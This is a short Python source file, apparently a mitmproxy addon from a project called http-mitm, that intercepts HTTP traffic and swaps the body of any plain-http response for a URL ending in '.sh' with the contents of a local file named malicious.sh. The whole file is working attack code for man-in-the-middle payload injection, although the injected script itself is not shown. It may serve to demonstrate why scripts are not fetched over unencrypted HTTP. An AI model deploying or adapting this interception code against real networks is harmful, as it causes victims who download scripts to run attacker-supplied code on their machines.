# mitm/rewrite_payload.py
# http-mitm
# Author: Rushy Panchal
# Date: December 22nd, 2017
# Description: Rewrite payload of the request to a malicious shell script.

import os

MALICIOUS_SCRIPT_PATH = os.getenv('MALICIOUS_SCRIPT', 'mitm/malicious.sh')

with open(MALICIOUS_SCRIPT_PATH, 'r') as f:
  MALICIOUS_SCRIPT = f.read().encode('utf8')

def response(flow):
    if is_target(flow.request.pretty_url):
        flow.response.content = MALICIOUS_SCRIPT

def is_target(url):
  '''Check if the url is a target.'''
  return url.startswith('http://') and url.endswith('.sh')
